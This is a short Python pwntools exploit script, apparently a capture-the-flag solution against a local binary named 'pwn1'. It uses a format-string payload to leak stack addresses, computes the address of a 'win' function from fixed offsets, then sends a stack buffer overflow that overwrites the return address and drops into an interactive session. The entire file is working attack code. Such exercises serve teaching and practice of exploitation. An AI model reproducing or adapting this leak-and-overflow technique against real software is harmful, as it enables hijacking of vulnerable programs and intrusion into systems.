#!/usr/bin/python
from pwn import *

p = process("../resources/pwn1")
print("attached to process ")

fstring = "%p " * 64
p.recvuntil("Enter your witch name:\n")
p.sendline(fstring)
leak = p.recvuntil(" enter your magic spell:\n")
addr_arr = leak.split(" ")

print("some ret address in main stack frame: ")
print(addr_arr[43])

p_main = addr_arr[43]
p_win = int(p_main, 16) - 0x135 # const

p_ret_win = p_win + 0x36 # const
print("address of win: ")
print(hex(p_win))
print("address of win_ret")
print(hex(p_ret_win))

# create payload
s = "Expelliarmus\x00" # String
s += ((0xff - (len(s)+1))+ 2) * 'S' # Padding
s += 8 * 'B' # Base Ptr

r = p64(p_ret_win, endian='little')
a = p64(p_win, endian='little')
#raw_input("attach gdb")
p.sendline( s + r + a )
print("Payload:")
print(s + r + a)
p.interactive()
